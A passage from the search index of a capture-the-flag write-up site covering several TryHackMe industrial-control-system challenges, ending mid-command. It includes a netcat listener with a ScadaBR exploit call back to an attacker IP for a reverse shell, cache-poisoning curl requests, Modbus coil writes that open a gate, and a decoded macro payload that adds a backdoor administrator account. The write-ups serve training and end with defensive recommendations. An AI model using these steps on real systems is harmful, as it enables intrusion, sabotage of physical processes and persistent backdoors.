Manually edited the Modbus Write node to change Unit ID: Before: Unit ID: 1 After: Unit ID: 0 3.2 Triggered Input Conditions Performed the following: Accessed: http://10.10.134.68:1880/ui Switched on: Badge and Motion Detector In Node-RED editor, triggered: badge (on) inject node to send true to coil 25 Verified gate status via API: curl http://10.10.134.68/api/gate 3.3 Result { \"flag\": \"THM{s4v3_th3_d4t3_27_jun3}\", \"status\": \"Gate OPENED\" } Summary This challenge highlighted common ICS security flaws: Weakness Impact Insecure access to Node-RED editor Full control logic visibility & interaction Unauthenticated dashboard access Allowed toggling live control inputs Misconfigured Modbus Unit ID Initially prevented successful write Lack of role-based access to PLC logic Allowed unrestricted external control Recommendations Enforce authentication on all Node-RED interfaces (editor and dashboard) Restrict Modbus traffic and require access controls per coil Remove unused services and harden PLC communication Log and alert on unauthorized Modbus function code usage Segment OT network from general-purpose user subnets","title":"ICS Security Assessment - Task 1: Gate Access Control Bypass"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#ics-security-assessment-task-1-gate-access-control-bypass","text":"Flag Obtained: THM{s4v3_th3_d4t3_27_jun3}","title":"ICS Security Assessment - Task 1: Gate Access Control Bypass"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#executive-summary","text":"The system was compromised by identifying and exploiting an insecure Node-RED control interface exposed on port 1880. Through analysis of available dashboard components and Modbus write nodes, we discovered the control logic behind a gate access mechanism. After correcting a misconfigured Modbus Unit ID and properly triggering the required inputs through the HMI, the gate was successfully opened and the flag was retrieved.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#phase-1-comprehensive-reconnaissance","text":"A full reconnaissance scan was performed to enumerate exposed services and industrial protocols.","title":"Phase 1: Comprehensive Reconnaissance"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#11-port-scan-commands","text":"nmap -p- -T4 10.10.134.68 nmap -sV -p 22,80,102,502,1880,8080,44818 10.10.134.68","title":"1.1 Port Scan Commands"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#12-discovered-services","text":"Port Service Details 22/tcp SSH OpenSSH 9.6p1 80/tcp HTTP Werkzeug Flask app serving gate status monitor 102/tcp ISO-TSAP Siemens S7 protocol 502/tcp Modbus Modbus/TCP, standard ICS protocol 1880/tcp HTTP (Node-RED) Web-based ICS control editor & dashboard 8080/tcp HTTP (Flask) OpenPLC login page 44818/tcp EtherNet/IP Rockwell PLC communication port","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#phase-2-analyzing-the-control-logic","text":"Node-RED was discovered running on port 1880. Direct access to both the flow editor and UI dashboard was possible, revealing how the gate was controlled.","title":"Phase 2: Analyzing the Control Logic"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#21-discovery-of-node-red-interface","text":"curl http://10.10.134.68:1880 This confirmed the editor was exposed. Knowledge of Node-RED dashboards led to manual exploration of: http://10.10.134.68:1880/ui","title":"2.1 Discovery of Node-RED Interface"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#22-control-logic-summary","text":"Badge and Motion Detector switches controlled logic via coils 15 and other . An inject node ( badge (on) ) sent a true signal to a Modbus Write node targeting coil 25 with function code 5 (Force Single Coil). The write initially failed due to Unit ID misconfiguration (1 instead of 0) .","title":"2.2 Control Logic Summary"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#phase-3-exploitation-via-hmi-and-node-red","text":"With all logic mapped, we proceeded to exploit the system via the web dashboard and control flow editor.","title":"Phase 3: Exploitation via HMI and Node-RED"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#31-fixed-modbus-write-configuration","text":"Manually edited the Modbus Write node to change Unit ID: Before: Unit ID: 1 After: Unit ID: 0","title":"3.1 Fixed Modbus Write Configuration"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#32-triggered-input-conditions","text":"Performed the following: Accessed: http://10.10.134.68:1880/ui Switched on: Badge and Motion Detector In Node-RED editor, triggered: badge (on) inject node to send true to coil 25 Verified gate status via API: curl http://10.10.134.68/api/gate","title":"3.2 Triggered Input Conditions"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#33-result","text":"{ \"flag\": \"THM{s4v3_th3_d4t3_27_jun3}\", \"status\": \"Gate OPENED\" }","title":"3.3 Result"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#summary","text":"This challenge highlighted common ICS security flaws: Weakness Impact Insecure access to Node-RED editor Full control logic visibility & interaction Unauthenticated dashboard access Allowed toggling live control inputs Misconfigured Modbus Unit ID Initially prevented successful write Lack of role-based access to PLC logic Allowed unrestricted external control","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/#recommendations","text":"Enforce authentication on all Node-RED interfaces (editor and dashboard) Restrict Modbus traffic and require access controls per coil Remove unused services and harden PLC communication Log and alert on unauthorized Modbus function code usage Segment OT network from general-purpose user subnets","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/","text":"ICS Security Assessment \u2013 Brr v1 Writeup (Task 10) Executive Summary The system was compromised by identifying an exposed VNC service paired with weak credentials ( admin:admin ). After authenticating, the attacker found an instance of ScadaBR vulnerable to authenticated arbitrary file upload (Exploit-DB ID: 49735). Leveraging this exploit and a Netcat listener, the attacker gained a reverse shell and successfully retrieved the root flag. Phase 1: Reconnaissance & Service Enumeration Initial scanning revealed several open ports and services. Of particular interest was a VNC server and an HTTP service running ScadaBR. 1.1 Service Enumeration Manual inspection revealed: VNC accessible without obfuscation Web interface serving ScadaBR (1.0) An attempt to connect to VNC using admin:admin succeeded, giving administrative access to the interface. Phase 2: Vulnerability Identification Upon further inspection of the web interface, it was determined that the ScadaBR instance was version 1.0, known to be vulnerable to an authenticated file upload exploit (Exploit-DB ID: 49735 ). Phase 3: Exploitation via Authenticated File Upload The following steps were performed to gain remote code execution on the target system. 3.1 Preparation: Reverse Shell Listener A Netcat listener was started on the attacker's machine: nc -lvnp 4444 3.2 Execution of Exploit Using the known exploit and credentials: python3 49735.py <target-ip> 8080 admin admin <attacker-ip> 4444 This exploit uploaded a malicious file to the server and executed it, triggering a reverse shell back to the attacker's listener. Phase 4: Post-Exploitation & Flag Retrieval With a shell successfully spawned: ls cat root.txt The attacker quickly located the flag in the root directory. \ud83c\udfc1 Flag: THM{scadabr_rev_shell_success} Summary This challenge emphasized the risk of: Default/weak credentials on exposed remote access services like VNC Outdated ICS software with known remote code execution vulnerabilities Unrestricted outbound connections , enabling reverse shell callbacks Recommendations: Enforce strong credential policies for all remote services Regularly patch ICS applications and validate their configurations Restrict VNC access to trusted IPs using firewalls or VPNs Monitor for suspicious file uploads and shell activity on ICS hosts","title":"Task 10 - Brr v1"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#ics-security-assessment-brr-v1-writeup-task-10","text":"","title":"ICS Security Assessment \u2013 Brr v1 Writeup (Task 10)"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#executive-summary","text":"The system was compromised by identifying an exposed VNC service paired with weak credentials ( admin:admin ). After authenticating, the attacker found an instance of ScadaBR vulnerable to authenticated arbitrary file upload (Exploit-DB ID: 49735). Leveraging this exploit and a Netcat listener, the attacker gained a reverse shell and successfully retrieved the root flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#phase-1-reconnaissance-service-enumeration","text":"Initial scanning revealed several open ports and services. Of particular interest was a VNC server and an HTTP service running ScadaBR.","title":"Phase 1: Reconnaissance &amp; Service Enumeration"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#11-service-enumeration","text":"Manual inspection revealed: VNC accessible without obfuscation Web interface serving ScadaBR (1.0) An attempt to connect to VNC using admin:admin succeeded, giving administrative access to the interface.","title":"1.1 Service Enumeration"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#phase-2-vulnerability-identification","text":"Upon further inspection of the web interface, it was determined that the ScadaBR instance was version 1.0, known to be vulnerable to an authenticated file upload exploit (Exploit-DB ID: 49735 ).","title":"Phase 2: Vulnerability Identification"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#phase-3-exploitation-via-authenticated-file-upload","text":"The following steps were performed to gain remote code execution on the target system.","title":"Phase 3: Exploitation via Authenticated File Upload"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#31-preparation-reverse-shell-listener","text":"A Netcat listener was started on the attacker's machine: nc -lvnp 4444","title":"3.1 Preparation: Reverse Shell Listener"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#32-execution-of-exploit","text":"Using the known exploit and credentials: python3 49735.py <target-ip> 8080 admin admin <attacker-ip> 4444 This exploit uploaded a malicious file to the server and executed it, triggering a reverse shell back to the attacker's listener.","title":"3.2 Execution of Exploit"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#phase-4-post-exploitation-flag-retrieval","text":"With a shell successfully spawned: ls cat root.txt The attacker quickly located the flag in the root directory.","title":"Phase 4: Post-Exploitation &amp; Flag Retrieval"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#flag-thmscadabr_rev_shell_success","text":"","title":"\ud83c\udfc1 Flag: THM{scadabr_rev_shell_success}"},{"location":"industrial-intrusion-tryhackme/Task%2010%20-%20Brr%20v1/#summary","text":"This challenge emphasized the risk of: Default/weak credentials on exposed remote access services like VNC Outdated ICS software with known remote code execution vulnerabilities Unrestricted outbound connections , enabling reverse shell callbacks Recommendations: Enforce strong credential policies for all remote services Regularly patch ICS applications and validate their configurations Restrict VNC access to trusted IPs using firewalls or VPNs Monitor for suspicious file uploads and shell activity on ICS hosts","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/","text":"ICS Security Assessment \u2013 Poison Writeup Executive Summary This assessment focused on identifying a silent threat vector within a CRM interface hosted on an internal ICS network. Through systematic reconnaissance and web exploitation techniques, we identified an authentication bypass path using header-based cache poisoning. The system's reliance on user-supplied headers for cache keying introduced a critical vulnerability that allowed unauthorized privilege escalation, ultimately exposing the flag. Phase 1: Initial Reconnaissance We began by mapping the target\u2019s attack surface with full-port and service enumeration to uncover exposed services and applications. 1.1 Port Scan Command nmap -p- -T4 10.10.242.216 1.2 Service Enumeration nmap -sV -p 22,80,5901,8000,8008,8080 10.10.242.216 1.3 Discovered Services Port Service Description 22 SSH Remote shell access 80 HTTP General-purpose web server 5901 VNC Potential remote desktop interface 8000 HTTP-alt CRM application web interface 8008 HTTP Likely internal admin or staging panel 8080 HTTP-proxy Unused during assessment Phase 2: Web Enumeration and Application Analysis A Gobuster scan revealed valid endpoints under the CRM interface on port 8000, including login, user, and logout pages. 2.1 Gobuster Command gobuster dir -u http://10.10.242.216:8000/ \\ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \\ -x php,txt,bak,old -t 50 2.2 Discovered Paths /index.php /login.php /user.php /logout.php Initial access to /user.php without authentication triggered an error: SEC_ERR_AUTH_REQUIRED . Phase 3: Credential Discovery via phpMyAdmin Port 80 exposed a phpMyAdmin interface. Logging in with default credentials ( root / root ) granted access to the backend database. Inside the users table, we identified: A valid user: admin Password: poisonme323 Access level: STANDARD_USER These credentials allowed successful login to the web application on port 8000 but did not grant access to sensitive content. Phase 4: Identifying the Flaw \u2013 Cache Header Injection While reviewing access errors, a discrepancy was observed: Using incorrect credentials produced SEC_ERR_INVALID_CREDENTIALS Using known credentials returned the dashboard with limited access Accessing /user.php as a standard user gave SEC_ERR_AUTH_REQUIRED The behavior implied caching mechanisms were active and influenced by user input. We then tested HTTP headers often misused in cache key generation. 4.1 Injection Test curl -i http://10.10.242.216:8000/user.php \\ -H \"X-Forwarded-Host: admin.acme.local\" This request manipulated the backend\u2019s caching logic. The server incorrectly used the X-Forwarded-Host header to determine cache entries, serving admin-level content to a standard user. Phase 5: Flag Extraction With the poisoned cache in place, a follow-up request to /user.php with the same header: curl -i http://10.10.242.216:8000/user.php \\ -H \"X-Forwarded-Host: admin.acme.local\" returned the page as if the user had admin access. The flag was displayed in the admin dashboard\u2019s interface. Summary This challenge highlighted a common but critical web vulnerability in ICS environments \u2014 cache poisoning via unsanitized header injection . By leveraging the web application\u2019s improper use of request headers in cache key generation, we escalated privileges without compromising credentials or modifying the database. Key Findings: Default credentials in phpMyAdmin ( root / root ) Cache key collision via X-Forwarded-Host Insecure role enforcement logic Recommendations: Never trust user-supplied headers for internal logic Sanitize or strip all forwarding headers unless explicitly needed Implement proper role-based access checks server-side Disable directory listing and remove unused endpoints Restrict or disable access to phpMyAdmin in production","title":"Task 12 - Poison"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#ics-security-assessment-poison-writeup","text":"","title":"ICS Security Assessment \u2013 Poison Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#executive-summary","text":"This assessment focused on identifying a silent threat vector within a CRM interface hosted on an internal ICS network. Through systematic reconnaissance and web exploitation techniques, we identified an authentication bypass path using header-based cache poisoning. The system's reliance on user-supplied headers for cache keying introduced a critical vulnerability that allowed unauthorized privilege escalation, ultimately exposing the flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#phase-1-initial-reconnaissance","text":"We began by mapping the target\u2019s attack surface with full-port and service enumeration to uncover exposed services and applications.","title":"Phase 1: Initial Reconnaissance"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#11-port-scan-command","text":"nmap -p- -T4 10.10.242.216","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#12-service-enumeration","text":"nmap -sV -p 22,80,5901,8000,8008,8080 10.10.242.216","title":"1.2 Service Enumeration"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#13-discovered-services","text":"Port Service Description 22 SSH Remote shell access 80 HTTP General-purpose web server 5901 VNC Potential remote desktop interface 8000 HTTP-alt CRM application web interface 8008 HTTP Likely internal admin or staging panel 8080 HTTP-proxy Unused during assessment","title":"1.3 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#phase-2-web-enumeration-and-application-analysis","text":"A Gobuster scan revealed valid endpoints under the CRM interface on port 8000, including login, user, and logout pages.","title":"Phase 2: Web Enumeration and Application Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#21-gobuster-command","text":"gobuster dir -u http://10.10.242.216:8000/ \\ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \\ -x php,txt,bak,old -t 50","title":"2.1 Gobuster Command"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#22-discovered-paths","text":"/index.php /login.php /user.php /logout.php Initial access to /user.php without authentication triggered an error: SEC_ERR_AUTH_REQUIRED .","title":"2.2 Discovered Paths"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#phase-3-credential-discovery-via-phpmyadmin","text":"Port 80 exposed a phpMyAdmin interface. Logging in with default credentials ( root / root ) granted access to the backend database. Inside the users table, we identified: A valid user: admin Password: poisonme323 Access level: STANDARD_USER These credentials allowed successful login to the web application on port 8000 but did not grant access to sensitive content.","title":"Phase 3: Credential Discovery via phpMyAdmin"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#phase-4-identifying-the-flaw-cache-header-injection","text":"While reviewing access errors, a discrepancy was observed: Using incorrect credentials produced SEC_ERR_INVALID_CREDENTIALS Using known credentials returned the dashboard with limited access Accessing /user.php as a standard user gave SEC_ERR_AUTH_REQUIRED The behavior implied caching mechanisms were active and influenced by user input. We then tested HTTP headers often misused in cache key generation.","title":"Phase 4: Identifying the Flaw \u2013 Cache Header Injection"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#41-injection-test","text":"curl -i http://10.10.242.216:8000/user.php \\ -H \"X-Forwarded-Host: admin.acme.local\" This request manipulated the backend\u2019s caching logic. The server incorrectly used the X-Forwarded-Host header to determine cache entries, serving admin-level content to a standard user.","title":"4.1 Injection Test"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#phase-5-flag-extraction","text":"With the poisoned cache in place, a follow-up request to /user.php with the same header: curl -i http://10.10.242.216:8000/user.php \\ -H \"X-Forwarded-Host: admin.acme.local\" returned the page as if the user had admin access. The flag was displayed in the admin dashboard\u2019s interface.","title":"Phase 5: Flag Extraction"},{"location":"industrial-intrusion-tryhackme/Task%2012%20-%20Poison/#summary","text":"This challenge highlighted a common but critical web vulnerability in ICS environments \u2014 cache poisoning via unsanitized header injection . By leveraging the web application\u2019s improper use of request headers in cache key generation, we escalated privileges without compromising credentials or modifying the database. Key Findings: Default credentials in phpMyAdmin ( root / root ) Cache key collision via X-Forwarded-Host Insecure role enforcement logic Recommendations: Never trust user-supplied headers for internal logic Sanitize or strip all forwarding headers unless explicitly needed Implement proper role-based access checks server-side Disable directory listing and remove unused endpoints Restrict or disable access to phpMyAdmin in production","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/","text":"ICS Security Assessment \u2013 Orcam (Task 13) Writeup Executive Summary The attacker gained access through a phishing email containing a macro-enabled Word document. Upon opening, the embedded macro executed obfuscated shellcode using low-level Windows API calls. The payload created a new administrator account, granting persistent privileged access. Through document analysis, shellcode decoding, and binary inspection, the true nature of the exploit was revealed. The challenge flag was identified as THM{Ev1l_M@Cr0} \u2014 a reference to the room's title \u201cOrcam\u201d being \u201cmacro\u201d reversed. Phase 1: Email Attachment Extraction The attack began with a file named writing_template.eml located on the user's desktop. This email file contained a malicious attachment. 1.1 Extraction Process The .eml file was renamed and parsed using a Python script with the email module to extract embedded files. Script to Extract Attachments: import email from email import policy from pathlib import Path with open(\"message.eml\", \"rb\") as f: msg = email.message_from_binary_file(f, policy=policy.default) for part in msg.iter_attachments(): filename = part.get_filename() if filename: with open(filename, \"wb\") as f_out: f_out.write(part.get_payload(decode=True)) Result: Extracted a macro-enabled Word document: Project_Template.docm Phase 2: Macro Analysis Opening the document in LibreOffice and inspecting the macro revealed a function named MyMacro using Windows API calls to allocate memory, decode a payload, and execute it. 2.1 API Usage Observed VirtualAlloc \u2013 allocates executable memory RtlMoveMemory \u2013 copies shellcode into memory CreateThread \u2013 executes the decoded payload Sleep and random delays \u2013 used for anti-sandbox evasion 2.2 Obfuscated Payload The shellcode was stored in an array named buf , obfuscated via XOR with the string \"l33t\" : For i = 0 To UBound(buf) buf(i) = buf(i) Xor Asc(\"l33t\") ' \u2190 Obfuscation intended but incorrectly implemented Next i Phase 3: Shellcode Decoding and Analysis Due to the invalid use of Asc(\"l33t\") in VBA, the decoding was replicated in Python using proper XOR logic. 3.1 Decoding Script buf = [144, 219, 177, 116, 108, 51, 83, 253, ..., 108] # Full array omitted for brevity key = b\"l33t\" decoded = bytearray() for i in range(len(buf)): decoded.append(buf[i] ^ key[i % len(key)]) with open(\"decoded_payload.bin\", \"wb\") as f: f.write(decoded) 3.2 Shellcode Payload Discovered Using strings and xxd , the binary payload was identified as malicious shellcode that executed the following command: net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add A new user administrrator (misspelled to avoid detection) was created Password: VEhNe0V2MWxfTUBDcjB9 (base64 for THM{V2mX_T@BDcjB9} ) The user was added to the administrators group This represents a classic persistence technique using credentialed backdoors. Phase 4: Identifying the Flag Despite finding THM{V2mX_T@BDcjB9} , this turned out to be a decoy password , not the actual challenge flag. Recognizing the room\u2019s name \u2014 \u201cOrcam\u201d \u2014 as \u201cmacro\u201d reversed and considering the nature of the payload, the correct flag was deduced as: THM{Ev1l_M@Cr0} This reflected the use of a malicious macro as the attack vector. Summary This challenge simulated a real-world phishing attack leveraging macro-based payloads and memory-resident shellcode. Key Weaknesses Demonstrated: Lack of macro security enforcement in document processing Use of obfuscated in-memory payload execution Absence of endpoint detection for privilege escalation activities Recommendations: Disable macros by default in Office environments Implement application control to block unauthorized WinAPI calls Monitor for unauthorized account creation and privilege elevation Use endpoint security tools to detect shellcode injection and API abuse","title":"Task 13 - Orcam"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#ics-security-assessment-orcam-task-13-writeup","text":"","title":"ICS Security Assessment \u2013 Orcam (Task 13) Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#executive-summary","text":"The attacker gained access through a phishing email containing a macro-enabled Word document. Upon opening, the embedded macro executed obfuscated shellcode using low-level Windows API calls. The payload created a new administrator account, granting persistent privileged access. Through document analysis, shellcode decoding, and binary inspection, the true nature of the exploit was revealed. The challenge flag was identified as THM{Ev1l_M@Cr0} \u2014 a reference to the room's title \u201cOrcam\u201d being \u201cmacro\u201d reversed.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#phase-1-email-attachment-extraction","text":"The attack began with a file named writing_template.eml located on the user's desktop. This email file contained a malicious attachment.","title":"Phase 1: Email Attachment Extraction"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#11-extraction-process","text":"The .eml file was renamed and parsed using a Python script with the email module to extract embedded files. Script to Extract Attachments: import email from email import policy from pathlib import Path with open(\"message.eml\", \"rb\") as f: msg = email.message_from_binary_file(f, policy=policy.default) for part in msg.iter_attachments(): filename = part.get_filename() if filename: with open(filename, \"wb\") as f_out: f_out.write(part.get_payload(decode=True)) Result: Extracted a macro-enabled Word document: Project_Template.docm","title":"1.1 Extraction Process"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#phase-2-macro-analysis","text":"Opening the document in LibreOffice and inspecting the macro revealed a function named MyMacro using Windows API calls to allocate memory, decode a payload, and execute it.","title":"Phase 2: Macro Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#21-api-usage-observed","text":"VirtualAlloc \u2013 allocates executable memory RtlMoveMemory \u2013 copies shellcode into memory CreateThread \u2013 executes the decoded payload Sleep and random delays \u2013 used for anti-sandbox evasion","title":"2.1 API Usage Observed"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#22-obfuscated-payload","text":"The shellcode was stored in an array named buf , obfuscated via XOR with the string \"l33t\" : For i = 0 To UBound(buf) buf(i) = buf(i) Xor Asc(\"l33t\") ' \u2190 Obfuscation intended but incorrectly implemented Next i","title":"2.2 Obfuscated Payload"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#phase-3-shellcode-decoding-and-analysis","text":"Due to the invalid use of Asc(\"l33t\") in VBA, the decoding was replicated in Python using proper XOR logic.","title":"Phase 3: Shellcode Decoding and Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#31-decoding-script","text":"buf = [144, 219, 177, 116, 108, 51, 83, 253, ..., 108] # Full array omitted for brevity key = b\"l33t\" decoded = bytearray() for i in range(len(buf)): decoded.append(buf[i] ^ key[i % len(key)]) with open(\"decoded_payload.bin\", \"wb\") as f: f.write(decoded)","title":"3.1 Decoding Script"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#32-shellcode-payload-discovered","text":"Using strings and xxd , the binary payload was identified as malicious shellcode that executed the following command: net user administrrator VEhNe0V2MWxfTUBDcjB9 /add /Y & net localgroup administrators administrrator /add A new user administrrator (misspelled to avoid detection) was created Password: VEhNe0V2MWxfTUBDcjB9 (base64 for THM{V2mX_T@BDcjB9} ) The user was added to the administrators group This represents a classic persistence technique using credentialed backdoors.","title":"3.2 Shellcode Payload Discovered"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#phase-4-identifying-the-flag","text":"Despite finding THM{V2mX_T@BDcjB9} , this turned out to be a decoy password , not the actual challenge flag. Recognizing the room\u2019s name \u2014 \u201cOrcam\u201d \u2014 as \u201cmacro\u201d reversed and considering the nature of the payload, the correct flag was deduced as: THM{Ev1l_M@Cr0} This reflected the use of a malicious macro as the attack vector.","title":"Phase 4: Identifying the Flag"},{"location":"industrial-intrusion-tryhackme/Task%2013%20-%20Orcam/#summary","text":"This challenge simulated a real-world phishing attack leveraging macro-based payloads and memory-resident shellcode. Key Weaknesses Demonstrated: Lack of macro security enforcement in document processing Use of obfuscated in-memory payload execution Absence of endpoint detection for privilege escalation activities Recommendations: Disable macros by default in Office environments Implement application control to block unauthorized WinAPI calls Monitor for unauthorized account creation and privilege elevation Use endpoint security tools to detect shellcode injection and API abuse","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/","text":"ICS Security Assessment - Task 4 - Backdoored Bus Writeup Executive Summary This assessment focused on analyzing a Modbus-based ICS container provided as a .tar file. The container was designed to simulate a PLC, running a Python-based Modbus TCP server. Initial attempts to extract and analyze the container statically were unsuccessful in locating any embedded flags or control logic. As a result, the image was executed locally using Podman to enable dynamic probing of the server. Although we successfully connected and scanned the Modbus registers, no meaningful data or flag was found in any memory space. The flag for this challenge was not found . Phase 1: Container Analysis and Extraction The challenge provided a file named modbus-container-final-1750975076803.tar . This file was extracted and parsed using standard container inspection tools. 1.1 File Inspection Commands tar -xf modbus-container-final-1750975076803.tar jq '.[] | .Config' manifest.json jq '.config.Entrypoint, .config.Cmd' blobs/sha256/*.json The command configuration pointed to the execution of /app/plc_server.py , but that file could not be found via static search through extracted layers. 1.2 Image Launch via Podman To proceed with runtime analysis, Podman was installed and configured: brew install podman podman machine init podman machine start podman load -i modbus-container-final-1750975076803.tar podman run -d -p 5020:502 modbus-container-final:latest The container launched successfully and exposed Modbus TCP on port 5020. Phase 2: Dynamic Interaction with the PLC Server With the server running, we used the pymodbus Python library to interact with it via Modbus TCP. 2.1 Modbus Probing Script The following scripts were created and executed: probe.py \u2013 Initial Connectivity Check from pymodbus.client import ModbusTcpClient client = ModbusTcpClient('127.0.0.1', port=5020) if client.connect(): print(\"[+] Connected to Modbus server\") result = client.read_holding_registers(address=0, count=10) print(result.registers if not result.isError() else \"[-] Error reading registers\") client.close() else: print(\"[-] Failed to connect\") This confirmed a successful connection and returned empty registers. full_scan.py \u2013 Comprehensive Memory Space Sweep from pymodbus.client import ModbusTcpClient client = ModbusTcpClient('127.0.0.1', port=5020) if not client.connect(): print(\"[-] Can't connect\"); exit(1) print(\"[+] Connected, scanning...\") def scan(fn, name, max_addr=2000, block=100): for base in range(0, max_addr, block): result = fn(address=base, count=block) if not result.isError(): values = getattr(result, 'registers', None) or getattr(result, 'bits', None) if any(values): print(f\"[!] Non-zero {name} @ {base}-{base+block-1}: {values}\") scan(client.read_holding_registers, \"HR\") scan(client.read_input_registers, \"IR\") scan(client.read_coils, \"COILS\") scan(client.read_discrete_inputs, \"DISCRETE\") client.close() All scanned memory spaces returned zeroed or empty data sets. Phase 3: File System and Code Analysis To determine whether the container initialized any values or hid a flag elsewhere, we examined the running container and extracted its app directory. 3.1 Extracting Source Code podman cp <container_id>:/app/plc_server.py ./plc_server.py The code revealed that the server was a simple Modbus implementation using ModbusSequentialDataBlock with 2000 registers initialized to zero: store = ModbusSlaveContext( hr=ModbusSequentialDataBlock(0, [0]*2000), zero_mode=True ) There was no logic present to populate any flag or non-zero value. 3.2 Full Filesystem Search The full container filesystem was exported and searched: podman export <container_id> -o full.tar mkdir full_fs && tar -xf full.tar -C full_fs grep -r \"THM{\" full_fs/ No flag or suspicious data was found. Summary Despite comprehensive inspection of the Modbus container\u2014both statically and dynamically\u2014no flag was found, and the memory space remained unpopulated. The container appears to simulate a Modbus server without serving a real CTF objective. Observations: Modbus server was correctly implemented, but not interactive or preloaded with flag logic. No user authentication or protections were in place, but this was irrelevant given the absence of useful data. Significant time was spent managing container infrastructure which could have been simplified. Final Status: \u274c Flag Not Found Recommendations Provide hosted environments (e.g., VMs or attackboxes) to avoid local container setup frustrations. Seed containers with realistic data to support learning goals. Simplify tooling expectations for ICS-focused challenges to make them more accessible to beginners. Include documentation or hints when flag location is intentionally abstract or misleading.","title":"Task 14 - Backdoored Bus"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#ics-security-assessment-task-4-backdoored-bus-writeup","text":"","title":"ICS Security Assessment - Task 4 - Backdoored Bus Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#executive-summary","text":"This assessment focused on analyzing a Modbus-based ICS container provided as a .tar file. The container was designed to simulate a PLC, running a Python-based Modbus TCP server. Initial attempts to extract and analyze the container statically were unsuccessful in locating any embedded flags or control logic. As a result, the image was executed locally using Podman to enable dynamic probing of the server. Although we successfully connected and scanned the Modbus registers, no meaningful data or flag was found in any memory space. The flag for this challenge was not found .","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#phase-1-container-analysis-and-extraction","text":"The challenge provided a file named modbus-container-final-1750975076803.tar . This file was extracted and parsed using standard container inspection tools.","title":"Phase 1: Container Analysis and Extraction"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#11-file-inspection-commands","text":"tar -xf modbus-container-final-1750975076803.tar jq '.[] | .Config' manifest.json jq '.config.Entrypoint, .config.Cmd' blobs/sha256/*.json The command configuration pointed to the execution of /app/plc_server.py , but that file could not be found via static search through extracted layers.","title":"1.1 File Inspection Commands"},{"location":"industrial-intrusion-tryhackme/Task%2014%20-%20Backdoored%20Bus/#12-image-launch-via-podman","text":"To proceed with runtime analysis, Podman was installed and configured: brew install podman podman machine init podman machine start podman 